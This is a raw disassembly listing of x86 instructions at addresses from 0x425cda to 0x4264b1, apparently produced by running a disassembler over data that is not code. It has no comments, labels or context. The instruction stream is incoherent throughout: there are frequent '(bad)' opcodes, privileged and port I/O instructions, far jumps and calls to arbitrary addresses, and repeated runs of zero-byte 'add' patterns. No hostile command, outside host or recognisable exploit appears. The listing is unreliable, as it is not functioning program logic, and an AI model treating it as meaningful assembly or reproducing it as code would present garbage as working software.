  425cda:	mov    ah,0xd4
  425cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cdd:	cdq    
  425cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cdf:	stc    
  425ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ce1:	adc    eax,DWORD PTR [eax]
  425ce3:	inc    ebx
  425ce4:	je     0x425c7f
  425ce6:	hlt    
  425ce7:	push   ebx
  425ce8:	fist   WORD PTR [edi+0x2769410f]
  425cee:	jb     0x425d0d
  425cf0:	ins    BYTE PTR es:[edi],dx
  425cf1:	loop   0x425c9d
  425cf3:	push   cs
  425cf4:	jmp    0xf146d252
  425cf9:	push   ds
  425cfa:	outs   dx,DWORD PTR ds:[esi]
  425cfb:	mov    cs,esp
  425cfd:	lea    edi,[ebp+0x2e]
  425d00:	imul   edi,esp,0x13f263ae
  425d06:	add    BYTE PTR [eax+0x3c],al
  425d09:	sbb    edx,esi
  425d0b:	push   ebx
  425d0c:	xlat   BYTE PTR ds:[ebx]
  425d0d:	test   BYTE PTR [edi],cl
  425d0f:	cmp    eax,0x69
  425d14:	add    BYTE PTR [eax],al
  425d16:	cmp    al,0xac
  425d18:	arpl   bx,dx
  425d1a:	adc    eax,DWORD PTR [eax]
  425d1c:	inc    ecx
  425d1d:	sbb    al,0xe9
  425d1f:	icebp  
  425d20:	push   ebx
  425d21:	neg    DWORD PTR [edx+0x20690d0f]
  425d27:	scas   eax,DWORD PTR es:[edi]
  425d28:	sbb    eax,0xeb3d964
  425d2d:	jmp    0xde5c5745
  425d32:	or     BYTE PTR [esi],dh
  425d34:	adc    eax,0xe93293e9
  425d39:	mov    ecx,0xeea22d92
  425d3e:	xchg   ebx,eax
  425d3f:	mov    dl,0xd4
  425d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d42:	cdq    
  425d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d44:	in     al,dx
  425d45:	add    BYTE PTR [ebx+edi*2+0x78],bh
  425d49:	add    eax,DWORD PTR [eax-0x44]
  425d4c:	in     al,0xff
  425d4e:	xor    sp,bp
  425d51:	and    BYTE PTR [esi-0x490788d1],dh
  425d57:	inc    esp
  425d58:	xchg   ebp,eax
  425d59:	inc    esp
  425d5a:	dec    ebp
  425d5b:	fist   DWORD PTR [ecx-0x2e908940]
  425d61:	add    BYTE PTR [edi],0x99
  425d64:	adc    ecx,DWORD PTR [ecx+0x75350f3d]
  425d6a:	ins    DWORD PTR es:[edi],dx
  425d6b:	jmp    0xb4805ebf
  425d70:	mov    al,ds:0xdd75684e
  425d75:	call   0x2b9b57
  425d7a:	add    BYTE PTR [eax],al
  425d7c:	add    BYTE PTR [eax],al
  425d7e:	add    cl,al
  425d80:	ins    BYTE PTR es:[edi],dx
  425d81:	(bad)  
  425d83:	sub    BYTE PTR [edx+0x41634193],dh
  425d89:	jmp    0x32dbdd18
  425d8e:	mov    ?,WORD PTR ds:0x2ec6f7b1
  425d94:	mov    bl,0xe
  425d96:	and    dl,0xf7
  425d99:	pusha  
  425d9a:	out    dx,eax
  425d9b:	jns    0x425de2
  425d9d:	sbb    esi,DWORD PTR [ebx+eiz*1+0x2e]
  425da1:	in     eax,0x20
  425da3:	popf   
  425da4:	dec    edi
  425da5:	cmc    
  425da6:	int    0x69
  425da8:	inc    ebp
  425da9:	adc    al,0x74
  425dab:	leave  
  425dac:	xor    ah,ch
  425dae:	or     eax,0xfb6cf5dd
  425db3:	leave  
  425db4:	mov    edi,0xb3afc6a8
  425db9:	or     eax,0xacfd91eb
  425dbe:	inc    ax
  425dc0:	ins    BYTE PTR es:[edi],dx
  425dc1:	(bad)  
  425dc2:	imul   edx,DWORD PTR [eax-0x447fa6ee],0x568936d5
  425dcc:	fisttp DWORD PTR ds:0xcd0cd095
  425dd2:	xchg   DWORD PTR [esi+0xa],edx
  425dd5:	xchg   edx,eax
  425dd6:	jl     0x425e44
  425dd8:	mov    cl,0x12
  425dda:	or     edx,DWORD PTR [eiz*4-0x7e780459]
  425de1:	pop    esp
  425de2:	add    al,0x0
  425de4:	add    BYTE PTR [eax],al
  425de6:	add    BYTE PTR [eax],al
  425de8:	adc    eax,0xb2b26c1
  425ded:	inc    eax
  425dee:	cmc    
  425def:	daa    
  425df0:	sbb    eax,ebp
  425df2:	retf   
  425df3:	mov    ebp,0xfbd080c0
  425df8:	inc    ebx
  425df9:	xchg   edx,edx
  425dfb:	je     0x425d87
  425dfd:	xchg   ecx,eax
  425dfe:	pop    eax
  425dff:	adc    esi,DWORD PTR [ecx+ecx*4-0x13]
  425e03:	std    
  425e04:	bswap  esi
  425e06:	pop    es
  425e07:	xchg   dh,cl
  425e09:	hlt    
  425e0a:	nop
  425e0b:	loope  0x425dc4
  425e0d:	xchg   ebx,eax
  425e0e:	sub    eax,0x93fc8324
  425e13:	retf   
  425e14:	xchg   edx,eax
  425e15:	or     edx,DWORD PTR [ecx]
  425e17:	xchg   esp,eax
  425e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e1a:	push   es
  425e1b:	jg     0x425dc9
  425e1d:	scas   eax,DWORD PTR es:[edi]
  425e1e:	retf   0xf8ff
  425e21:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  425e23:	sti    
  425e24:	pop    es
  425e25:	mov    WORD PTR [edx+0x7f878f20],?
  425e2b:	repz mul DWORD PTR [ecx+edx*4]
  425e2f:	neg    DWORD PTR [eax-0x4]
  425e32:	xchg   ebx,eax
  425e33:	mov    bl,0x8e
  425e35:	or     edx,DWORD PTR [ecx]
  425e37:	ret    0xa56
  425e3a:	cmc    
  425e3b:	call   0xfbe0db44
  425e40:	adc    BYTE PTR [ebx+0x2f9b5770],dh
  425e46:	daa    
  425e47:	scas   eax,DWORD PTR es:[edi]
  425e48:	mov    ebx,0x493cf5
  425e4d:	add    BYTE PTR [eax],al
  425e4f:	add    BYTE PTR [eax],al
  425e51:	xchg   ecx,eax
  425e52:	iret   
  425e53:	dec    esi
  425e54:	sub    eax,0x8353f5a3
  425e59:	lahf   
  425e5a:	pop    esi
  425e5b:	cld    
  425e5c:	xchg   dl,bl
  425e5e:	mul    BYTE PTR [ebx]
  425e60:	mov    al,0xd2
  425e62:	ins    BYTE PTR es:[edi],dx
  425e63:	imul   cl
  425e65:	js     0x425df1
  425e67:	or     al,0xb0
  425e69:	mov    esi,DWORD PTR [edx]
  425e6b:	xor    BYTE PTR [ebx-0x75],dl
  425e6e:	das    
  425e6f:	push   ebx
  425e70:	scas   eax,DWORD PTR es:[edi]
  425e71:	jnp    0x425e68
  425e73:	xor    al,0x49
  425e75:	xchg   ecx,eax
  425e76:	int    0xfe
  425e78:	pop    eax
  425e79:	arpl   bp,si
  425e7b:	jmp    0x425dff
  425e7d:	(bad)
  425e81:	(bad)  
  425e82:	cmc    
  425e83:	sti    
  425e84:	scas   eax,DWORD PTR es:[edi]
  425e85:	push   edx
  425e86:	ins    BYTE PTR es:[edi],dx
  425e87:	neg    bl
  425e89:	cmp    BYTE PTR [esi-0x3c],ch
  425e8c:	scas   eax,DWORD PTR es:[edi]
  425e8d:	cmp    esp,DWORD PTR [edi]
  425e8f:	cmp    BYTE PTR [edi-0x7933558c],bh
  425e95:	mov    ah,0xac
  425e97:	test   DWORD PTR [ebx],0xc36da5b2
  425e9d:	mov    dl,0xc9
  425e9f:	cmp    ebp,eax
  425ea1:	jg     0x425e8f
  425ea3:	xor    al,0x5
  425ea5:	mov    ecx,0xa0465e8c
  425eaa:	or     ebx,eax
  425eac:	mov    dh,0xfb
  425eae:	hlt    
  425eaf:	jbe    0x425e5c
  425eb1:	stos   BYTE PTR es:[edi],al
  425eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425eb3:	jb     0x425e95
  425eb5:	add    BYTE PTR [eax],al
  425eb7:	add    BYTE PTR [eax],al
  425eb9:	add    dh,ah
  425ebb:	hlt    
  425ebc:	xchg   ebx,eax
  425ebd:	(bad)  
  425ebe:	push   edx
  425ebf:	mov    bl,0xc1
  425ec1:	pushf  
  425ec2:	cmp    ebp,0x2727760d
  425ec8:	push   ecx
  425ec9:	cdq    
  425eca:	shr    BYTE PTR [ecx-0x4d4291e3],0xe
  425ed1:	jmp    0x2aef084b
  425ed6:	outs   dx,BYTE PTR ds:[esi]
  425ed7:	int    0x52
  425ed9:	add    eax,0xe853f09c
  425ede:	retf   0x9792
  425ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ee2:	or     DWORD PTR [ebx],0xf8e73fde
  425ee8:	lea    esi,[edx]
  425eea:	xchg   ecx,eax
  425eeb:	jge    0x425f04
  425eed:	das    
  425eee:	into   
  425eef:	mov    cl,0x3a
  425ef1:	adc    BYTE PTR [edx],dh
  425ef3:	add    ebp,ebp
  425ef5:	push   ss
  425ef6:	or     al,0xfc
  425ef8:	pop    ss
  425ef9:	ficomp WORD PTR [eax]
  425efb:	push   edi
  425efc:	jmp    0x14c9607
  425f01:	std    
  425f02:	cs clc 
  425f04:	(bad)  
  425f05:	repnz pop ecx
  425f07:	test   eax,0xf7ffe392
  425f0c:	in     al,dx
  425f0d:	jae    0x425edc
  425f0f:	lahf   
  425f10:	xor    dh,BYTE PTR [ebp+0x3f]
  425f13:	mov    al,ds:0xb28e3cf7
  425f18:	push   cs
  425f19:	fisub  WORD PTR [ebp+0x719833]
  425f1f:	add    BYTE PTR [eax],al
  425f21:	add    BYTE PTR [eax],al
  425f23:	inc    ebx
  425f24:	pop    eax
  425f25:	dec    esi
  425f26:	jmp    0x6d5f4942
  425f2b:	or     eax,0xee90eb2
  425f30:	inc    edx
  425f31:	push   esp
  425f32:	jmp    0x425eff
  425f34:	jae    0x425f1c
  425f36:	repnz (bad) 
  425f38:	xor    cl,bh
  425f3a:	xchg   ebx,eax
  425f3b:	es clc 
  425f3d:	in     al,dx
  425f3e:	lds    ebx,FWORD PTR [eax]
  425f40:	stos   DWORD PTR es:[edi],eax
  425f41:	sub    BYTE PTR [eax],al
  425f43:	mov    ebx,0xea46e8ae
  425f48:	das    
  425f49:	out    0x6f,eax
  425f4b:	out    dx,al
  425f4c:	sbb    cl,dh
  425f4e:	(bad)  
  425f4f:	icebp  
  425f50:	or     ebp,ebx
  425f52:	call   0x5110b6
  425f57:	pop    edi
  425f58:	ins    DWORD PTR es:[edi],dx
  425f59:	in     eax,dx
  425f5a:	jg     0x425fbc
  425f5c:	xchg   ebp,eax
  425f5d:	sbb    DWORD PTR [ebp+0x24d64579],edx
  425f63:	mov    edx,0xa902ca16
  425f68:	scas   eax,DWORD PTR es:[edi]
  425f69:	call   0xe77209b4
  425f6e:	outs   dx,BYTE PTR ds:[esi]
  425f6f:	inc    ebp
  425f70:	hlt    
  425f71:	ins    BYTE PTR es:[edi],dx
  425f72:	stc    
  425f73:	and    eax,0x9fc081f4
  425f78:	aaa    
  425f79:	xor    al,BYTE PTR [esi]
  425f7b:	nop
  425f7c:	jmp    0x24f:0xed79ffeb
  425f83:	jne    0x425f9b
  425f85:	scas   al,BYTE PTR es:[edi]
  425f86:	cli    
  425f87:	add    BYTE PTR [eax],al
  425f89:	add    BYTE PTR [eax],al
  425f8b:	add    BYTE PTR [esi+0x45],bl
  425f8e:	call   0x40bbc9d9
  425f93:	add    edi,DWORD PTR [ecx-0x49f0ebb7]
  425f99:	sub    ah,dh
  425f9b:	call   FWORD PTR [esi-0xb]
  425f9e:	sahf   
  425f9f:	ret    0x76a3
  425fa2:	sub    cl,BYTE PTR [ebp-0x7ae65187]
  425fa8:	fs inc esi
  425faa:	jmp    0x32b503ae
  425faf:	adc    edx,ebx
  425fb1:	test   DWORD PTR [edx+edi*1+0x29],0x5244279
  425fb9:	not    BYTE PTR [ecx-0x16bad8dc]
  425fbf:	mov    BYTE PTR [eax-0x7316ef3d],dl
  425fc5:	sbb    edi,DWORD PTR [ebx+0xfc2e6fb]
  425fcb:	xchg   BYTE PTR [esi+0x8],al
  425fce:	xchg   ecx,eax
  425fcf:	test   BYTE PTR [eax-0x37b86df4],0x83
  425fd6:	mov    ebx,0xf8c6fe0b
  425fdb:	xchg   DWORD PTR [eax-0x7a],ecx
  425fde:	push   edx
  425fdf:	add    BYTE PTR [edi-0x5008217a],al
  425fe5:	arpl   WORD PTR [eax+0x4c],bp
  425fe8:	ins    BYTE PTR es:[edi],dx
  425fe9:	fcom   DWORD PTR [eax+0x46808ff6]
  425fef:	and    al,0x0
  425ff1:	add    BYTE PTR [eax],al
  425ff3:	add    BYTE PTR [eax],al
  425ff5:	jl     0x426003
  425ff7:	xchg   esp,eax
  425ff8:	in     eax,dx
  425ff9:	test   DWORD PTR [ecx-0xc669945],esp
  425fff:	test   esp,eax
  426001:	jle    0x42601d
  426003:	push   cs
  426004:	xchg   dh,bl
  426006:	fcom   QWORD PTR [eax-0x6def610a]
  42600c:	adc    ebp,DWORD PTR [eax-0x47]
  42600f:	mov    ebx,0xf89e260b
  426014:	xchg   DWORD PTR [esi+edx*2+0x569f0052],esi
  42601b:	jmp    0x744c:0x66d947f7
  426022:	in     al,dx
  426023:	nop
  426024:	test   BYTE PTR [ebp-0x7bdbbaac],0x10
  42602b:	xchg   esp,eax
  42602c:	mov    ecx,0xc2b9f91d
  426031:	(bad)  
  426032:	fucom  st(6)
  426034:	call   0xfbfc8f19
  426039:	push   cs
  42603a:	call   0x19f8:0xb25e860f
  426041:	mov    eax,ds:0x8bd3f18a
  426046:	cmp    DWORD PTR [edx-0x340e144c],esp
  42604c:	jne    0x426074
  42604e:	lods   eax,DWORD PTR ds:[esi]
  42604f:	pop    edi
  426050:	pop    ds
  426051:	or     eax,0xcfcf773
  426056:	add    DWORD PTR [esp+ebp*4+0x0],ebp
  42605a:	add    BYTE PTR [eax],al
  42605c:	add    BYTE PTR [eax],al
  42605e:	retf   
  42605f:	cmp    al,0xb
  426061:	call   0x13b392fc
  426066:	pop    ss
  426067:	xchg   DWORD PTR [ebx],edx
  426069:	sbb    BYTE PTR [ebx-0x54493bc9],cl
  42606f:	icebp  
  426070:	xor    al,0x45
  426072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426073:	mov    esp,0xf1a5353e
  426078:	sub    ebp,DWORD PTR [ebp+0x5571b552]
  42607e:	(bad)  
  42607f:	jno    0x4260a2
  426081:	add    al,0x9b
  426083:	cmp    DWORD PTR [edx-0x4c],ebx
  426086:	jnp    0x426079
  426088:	sti    
  426089:	jne    0x4260c1
  42608b:	lods   al,BYTE PTR ds:[esi]
  42608c:	outs   dx,DWORD PTR ds:[esi]
  42608d:	sbb    DWORD PTR ds:0xcfcf772,0x48
  426094:	in     al,dx
  426095:	stos   DWORD PTR es:[edi],eax
  426096:	pop    ebx
  426097:	cmp    al,0xbb
  426099:	out    0x86,eax
  42609b:	xor    ah,cl
  42609d:	add    al,0x17
  42609f:	xchg   bl,dl
  4260a1:	pop    ss
  4260a2:	fwait
  4260a3:	aaa    
  4260a4:	cmp    al,0xb1
  4260a6:	cmp    esi,ecx
  4260a8:	mov    ah,0x42
  4260aa:	ss mov ebp,0xf124eace
  4260b0:	fstp   TBYTE PTR [esi-0x2c]
  4260b3:	xchg   esi,eax
  4260b4:	enter  0x2783,0x92
  4260b8:	cld    
  4260b9:	jg     0x42611c
  4260bb:	out    0xd,eax
  4260bd:	mov    dh,0x3b
  4260bf:	hlt    
  4260c0:	push   ebx
  4260c1:	jmp    0x4260c3
  4260c3:	add    BYTE PTR [eax],al
  4260c5:	add    BYTE PTR [eax],al
  4260c7:	xchg   ebx,eax
  4260c8:	(bad)  ds:0x8ded2b9c
  4260ce:	mov    ds:0xaf4965e6,al
  4260d3:	push   edx
  4260d4:	mov    bl,0x3d
  4260d6:	push   0xffffffb8
  4260d8:	xchg   esi,eax
  4260d9:	xor    ch,cl
  4260db:	fidiv  DWORD PTR [ecx*2-0x6712d480]
  4260e2:	adc    ecx,esp
  4260e4:	xor    eax,0x37bcf5c9
  4260e9:	inc    edx
  4260ea:	or     eax,0x12d537b0
  4260ef:	into   
  4260f0:	sbb    DWORD PTR [ecx-0x6cff04d9],0x98b86029
  4260fa:	scas   eax,DWORD PTR es:[edi]
  4260fb:	adc    BYTE PTR [esi+0x3a8eed91],0x54
  426102:	fimul  WORD PTR ds:0x2d69057d
  426108:	ins    BYTE PTR es:[edi],dx
  426109:	xchg   esi,eax
  42610a:	mov    ch,0x5f
  42610c:	shl    DWORD PTR [edx-0x7],0x56
  426110:	out    dx,eax
  426111:	call   0x3b14:0xacd994ae
  426118:	in     al,dx
  426119:	xchg   edi,eax
  42611a:	mov    ch,0x3f
  42611c:	sar    ecx,0xe5
  42611f:	(bad)  
  426120:	xchg   BYTE PTR [edx],dh
  426122:	fst    QWORD PTR [esi]
  426124:	push   edi
  426125:	xor    al,ch
  426127:	xchg   ebx,eax
  426128:	(bad)  
  42612a:	fld    QWORD PTR [eax]
  42612c:	add    BYTE PTR [eax],al
  42612e:	add    BYTE PTR [eax],al
  426130:	jmp    0x1467:0x38e28deb
  426137:	scas   eax,DWORD PTR es:[edi]
  426138:	shl    DWORD PTR [ecx+0x3319c220],1
  42613e:	jmp    0x922f8443
  426143:	popf   
  426144:	sub    dh,BYTE PTR [esi+ecx*1+0x30d2b58b]
  42614b:	(bad)  
  42614c:	scas   eax,DWORD PTR es:[edi]
  42614d:	mov    ch,0x3b
  42614f:	test   DWORD PTR [eax-0x13],eax
  426152:	nop
  426153:	out    dx,eax
  426154:	xor    DWORD PTR ds:0xeea38be9,ebx
  42615a:	xchg   ecx,eax
  42615b:	fstp   TBYTE PTR [ebp-0xb]
  42615e:	xchg   esp,eax
  42615f:	mov    edx,0x2d194f6
  426165:	inc    esp
  426166:	mov    ?,ebx
  426168:	fldlg2 
  42616a:	nop
  42616b:	mov    WORD PTR ds:0xc06ae91c,?
  426171:	jnp    0x426197
  426173:	fsub   DWORD PTR [esi+0x46f48f6f]
  426179:	sbb    al,0x95
  42617b:	inc    esp
  42617c:	lea    edi,[edx-0x50593f6d]
  426182:	ror    DWORD PTR [ecx-0x39f6f013],1
  426188:	aas    
  426189:	mov    dh,0x1e
  42618b:	(bad)  
  42618c:	das    
  42618d:	mov    eax,0xeab2800e
  426192:	popa   
  426193:	push   eax
  426194:	add    BYTE PTR [eax],al
  426196:	add    BYTE PTR [eax],al
  426198:	add    BYTE PTR [edi],cl
  42619a:	hlt    
  42619b:	dec    edi
  42619c:	add    DWORD PTR [ebx-0x4d],ecx
  42619f:	xchg   ebx,eax
  4261a0:	rol    BYTE PTR [esi+0x6f],0x47
  4261a4:	hlt    
  4261a5:	xchg   esi,eax
  4261a6:	sbb    al,0x95
  4261a8:	pop    edx
  4261a9:	gs xor al,ch
  4261ac:	je     0x4261b6
  4261ae:	jo     0x4261f2
  4261b0:	and    al,0x55
  4261b2:	jo     0x426185
  4261b4:	sub    ebp,DWORD PTR [ebp-0x2e]
  4261b7:	or     BYTE PTR [ebx-0x2c167a19],cl
  4261bd:	nop
  4261be:	pop    esi
  4261bf:	shl    BYTE PTR [edx+ebx*4+0x53],cl
  4261c3:	push   eax
  4261c4:	adc    esi,DWORD PTR [ebp+ebx*2-0x1a]
  4261c8:	add    ecx,DWORD PTR [eax]
  4261ca:	xchg   edi,eax
  4261cb:	inc    DWORD PTR [ebp-0x1e6eefa2]
  4261d1:	xchg   DWORD PTR [ecx+0x26],edx
  4261d4:	and    al,0xa3
  4261d6:	call   0x50399d46
  4261db:	mov    bh,0x87
  4261dd:	inc    esp
  4261de:	std    
  4261df:	sbb    al,0x7f
  4261e1:	ins    BYTE PTR es:[edi],dx
  4261e2:	cmc    
  4261e3:	adc    al,0x0
  4261e5:	jmp    0xd83e1ef9
  4261ea:	pop    eax
  4261eb:	mov    ebx,0xcedf4506
  4261f0:	inc    edx
  4261f1:	xchg   ecx,eax
  4261f2:	mov    ah,BYTE PTR cs:[edi-0x1afb071]
  4261f9:	or     DWORD PTR [edx+edx*4+0xc9],esp
  426200:	add    BYTE PTR [eax],al
  426202:	jo     0x426260
  426204:	mov    cl,BYTE PTR [ecx]
  426206:	sbb    al,0x4e
  426208:	sub    DWORD PTR [esi+esi*2+0x21],esi
  42620c:	cmp    eax,0xcd1d0a13
  426211:	push   cs
  426212:	push   esi
  426213:	push   ds
  426214:	adc    eax,DWORD PTR [eax]
  426216:	fmul   DWORD PTR [esp+ebp*2]
  426219:	jmp    0x80f9f7a1
  42621e:	xchg   BYTE PTR [ebx],bl
  426220:	mov    cl,ah
  426222:	arpl   bp,ax
  426224:	mov    bh,0x80
  426226:	imul   edi,DWORD PTR [ecx],0xb65094e6
  42622c:	stos   BYTE PTR es:[edi],al
  42622d:	and    al,0x85
  42622f:	shl    dh,0x86
  426232:	fdiv   st(7),st
  426234:	sbb    BYTE PTR [esi+0x25e83253],al
  42623a:	push   ecx
  42623b:	mov    bl,0x51
  42623d:	out    dx,al
  42623e:	cmc    
  42623f:	mov    ebp,0xee2ec074
  426244:	idiv   al
  426246:	jmp    0xfa05723c
  42624b:	cmp    edi,DWORD PTR ds:0xfb8508fc
  426251:	call   0xec10:0xa8a3e842
  426258:	dec    edi
  426259:	das    
  42625a:	mov    esp,esi
  42625c:	cmp    al,0x6
  42625e:	mov    bl,bl
  426260:	pushf  
  426261:	mov    al,0xeb
  426263:	in     eax,dx
  426264:	jbe    0x426210
  426266:	add    BYTE PTR [eax],al
  426268:	add    BYTE PTR [eax],al
  42626a:	add    BYTE PTR [edi-0x43],al
  42626d:	(bad)  
  42626f:	(bad)  
  426271:	(bad)  
  426273:	pcmpeqw mm7,mm1
  426276:	call   0xea10:0xa863e5ec
  42627d:	lock clc 
  42627f:	adc    al,0x8
  426281:	outs   dx,DWORD PTR ds:[esi]
  426282:	test   al,0xbb
  426284:	mov    ebp,0xf7ae4185
  426289:	mov    esp,0x4f316102
  42628e:	adc    esp,DWORD PTR [eax+ecx*8]
  426291:	lahf   
  426292:	das    
  426293:	mov    edi,DWORD PTR [edx-0x4]
  426296:	jle    0x426299
  426298:	loop   0x4262bd
  42629a:	test   al,0x10
  42629c:	mov    esp,0xe1e99ac7
  4262a1:	xor    ebp,DWORD PTR [eax-0x652043f0]
  4262a7:	icebp  
  4262a8:	loope  0x4262ad
  4262aa:	test   al,0x10
  4262ac:	mov    esp,0xe1b99af3
  4262b1:	adc    ebp,DWORD PTR [eax-0x71f16f0]
  4262b7:	adc    al,0x4f
  4262b9:	push   cs
  4262ba:	icebp  
  4262bb:	out    dx,eax
  4262bc:	call   0xed81ea51
  4262c1:	loop   0x4262f2
  4262c3:	xchg   DWORD PTR [edx],esi
  4262c5:	sbb    eax,0xecec7764
  4262ca:	jmp    0xaadb2b78
  4262cf:	add    BYTE PTR [eax],al
  4262d1:	add    BYTE PTR [eax],al
  4262d3:	add    BYTE PTR [edx+ebx*8+0xf],dl
  4262d7:	xchg   ecx,eax
  4262d8:	sub    al,0x61
  4262da:	add    eax,0x44da4672
  4262df:	in     eax,dx
  4262e0:	xchg   ebx,eax
  4262e1:	mov    dl,0x93
  4262e3:	test   eax,0x9f093107
  4262e8:	das    
  4262e9:	jmp    0xdbd60dd1
  4262ee:	adc    eax,0xb5e92f9f
  4262f3:	call   0x30171ea7
  4262f8:	lea    ebx,[ebp-0x16fd2509]
  4262fe:	in     al,dx
  4262ff:	bound  edi,QWORD PTR [esi-0x46]
  426302:	cdq    
  426303:	test   al,0xbb
  426305:	jb     0x426321
  426307:	fucom  st(1)
  426309:	int3   
  42630a:	pop    esp
  42630b:	in     eax,dx
  42630c:	adc    ch,bl
  42630e:	in     al,dx
  42630f:	frstor [edx+esi*8-0x264817ad]
  426316:	push   eax
  426317:	ds out dx,eax
  426319:	call   0x66d5adab
  42631e:	add    ah,BYTE PTR [edx+0x3e]
  426321:	fcmovne st,st(6)
  426323:	jmp    0xb9c0:0x2993b293
  42632a:	aam    0xa7
  42632c:	xchg   esp,eax
  42632d:	lods   eax,DWORD PTR ds:[esi]
  42632e:	test   DWORD PTR ds:0x62ece820,0xecdb26
  426338:	add    BYTE PTR [eax],al
  42633a:	add    BYTE PTR [eax],al
  42633c:	add    BYTE PTR [edx-0x50],ch
  42633f:	push   cs
  426340:	test   DWORD PTR [ecx-0x1d],edi
  426343:	nop
  426344:	ret    
  426345:	inc    esp
  426346:	adc    eax,0x4da284e9
  42634b:	lahf   
  42634c:	cmc    
  42634d:	cs adc eax,0xd6954495
  426353:	xchg   ecx,eax
  426354:	shr    BYTE PTR [esi],0xac
  426357:	ror    DWORD PTR [ebx-0x76c72d33],1
  42635d:	ror    BYTE PTR gs:[edi+ecx*2],cl
  426361:	loopne 0x4263c4
  426363:	cld    
  426364:	(bad)  
  426365:	ds in  eax,0x9e
  426368:	ret    
  426369:	jae    0x42639a
  42636b:	mov    esi,0x2ab6a960
  426370:	(bad)  
  426371:	(bad)  
  426372:	imul   esi,DWORD PTR [ecx],0x2
  426375:	stc    
  426376:	scas   eax,DWORD PTR es:[edi]
  426377:	sbb    DWORD PTR [esi+0x46973f29],edi
  42637d:	loope  0x4263ed
  42637f:	inc    eax
  426380:	or     al,0xf7
  426382:	lods   eax,DWORD PTR ds:[esi]
  426383:	sysenter 
  426385:	adc    BYTE PTR [edx-0x4],ch
  426388:	jmp    FWORD PTR [esi]
  42638a:	das    
  42638b:	in     eax,0xd
  42638d:	aam    0xee
  42638f:	into   
  426390:	inc    esi
  426391:	mov    eax,0x4b80f5dd
  426396:	adc    al,0xe9
  426398:	sysret 
  42639a:	icebp  
  42639b:	xchg   ebx,eax
  42639c:	cmp    BYTE PTR [ecx-0x71],0x4e
  4263a0:	add    BYTE PTR [eax],al
  4263a2:	add    BYTE PTR [eax],al
  4263a4:	add    BYTE PTR [eax],al
  4263a6:	lea    edx,[ebx+eiz*2]
  4263a9:	pop    ss
  4263aa:	stc    
  4263ab:	sbb    BYTE PTR ds:0xe52f7074,ah
  4263b1:	and    BYTE PTR [esi+0x32],bh
  4263b4:	cmc    
  4263b5:	add    DWORD PTR [ecx-0x51],edi
  4263b8:	rol    BYTE PTR [esi-0x70],1
  4263bb:	fcmovu st,st(5)
  4263bd:	call   0xfbf72b7e
  4263c2:	or     esp,DWORD PTR [ebx]
  4263c4:	jmp    0xe420524f
  4263c9:	mov    ds:0xb9e3dd5b,eax
  4263ce:	push   eax
  4263cf:	adc    dl,0xe1
  4263d2:	mov    eax,ds
  4263d4:	test   al,0xf
  4263d6:	dec    edx
  4263d7:	nop
  4263d8:	push   esp
  4263d9:	or     al,0x97
  4263db:	push   edi
  4263dc:	dec    edi
  4263dd:	add    DWORD PTR [eax+0x5b0939d9],edx
  4263e3:	mov    ds:0xb1120aea,eax
  4263e8:	adc    DWORD PTR [eax],eax
  4263ea:	nop
  4263eb:	push   eax
  4263ec:	rcr    DWORD PTR [edi],1
  4263ee:	rcl    DWORD PTR [edi-0x46],cl
  4263f1:	sti    
  4263f2:	xchg   DWORD PTR [ebp-0x39],ebx
  4263f5:	add    BYTE PTR [eax-0x67b59827],dl
  4263fb:	push   edx
  4263fc:	push   esp
  4263fd:	or     al,0xe9
  4263ff:	clc    
  426400:	mov    esp,0xb758d7fb
  426405:	or     eax,0xee00569f
  42640a:	add    BYTE PTR [eax],al
  42640c:	add    BYTE PTR [eax],al
  42640e:	add    bh,al
  426410:	arpl   WORD PTR [edi-0x179fef7d],ax
  426416:	or     cl,BYTE PTR ds:0xaffbba2d
  42641c:	pop    edi
  42641d:	sub    al,0x8
  42641f:	adc    edi,ebx
  426421:	in     al,dx
  426422:	dec    DWORD PTR [edx-0x778b1aed]
  426428:	pop    ecx
  426429:	in     al,0x1f
  42642b:	jns    0x42641b
  42642d:	mov    ecx,0x2c9a87fb
  426432:	add    DWORD PTR [ecx+0x77f18872],edi
  426438:	mov    bl,0x34
  42643a:	jns    0x426416
  42643c:	mov    edx,0xf1afbf60
  426441:	idiv   DWORD PTR [edi]
  426443:	mov    ah,0xa6
  426445:	pop    esi
  426446:	jns    0x426486
  426448:	ds (bad) 
  42644a:	test   DWORD PTR [esi-0x4a069bfb],0xafbba0ae
  426454:	scas   al,BYTE PTR es:[edi]
  426455:	jo     0x42641a
  426457:	prefetch BYTE PTR [eax+0x17]
  42645b:	je     0x4263ef
  42645d:	jb     0x4263f5
  42645f:	fwait
  426460:	outs   dx,BYTE PTR ds:[esi]
  426461:	aam    0xd8
  426463:	push   edi
  426464:	into   
  426465:	test   al,0x3b
  426467:	pop    ss
  426468:	loop   0x4264c9
  42646a:	ret    0x5719
  42646d:	adc    esp,esp
  42646f:	push   cs
  426470:	push   edi
  426471:	sbb    ebp,esp
  426473:	add    BYTE PTR [eax],al
  426475:	add    BYTE PTR [eax],al
  426477:	add    BYTE PTR [eax],cl
  426479:	jns    0x42646a
  42647b:	jns    0x4264c1
  42647d:	mov    gs,eax
  42647f:	jp     0x4264c3
  426481:	mov    dh,0xe0
  426483:	ror    DWORD PTR [edi],0x7f
  426486:	fisttp DWORD PTR [edi]
  426488:	mov    ebp,DWORD PTR [edi]
  42648a:	pusha  
  42648b:	mov    dl,0xdb
  42648d:	jmp    0xacd3a24e
  426492:	jle    0x426425
  426494:	shr    ecx,0x63
  426497:	add    edi,0xffffffb7
  42649a:	int3   
  42649b:	jle    0x42647f
  42649d:	loopne 0x426512
  42649f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264a0:	das    
  4264a1:	adc    sp,sp
  4264a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264a5:	out    dx,eax
  4264a6:	mov    esp,0x73b96702
  4264ab:	sub    DWORD PTR [ecx-0x1987ac17],esp
  4264b1:	mov    esi,0xa3fcc872
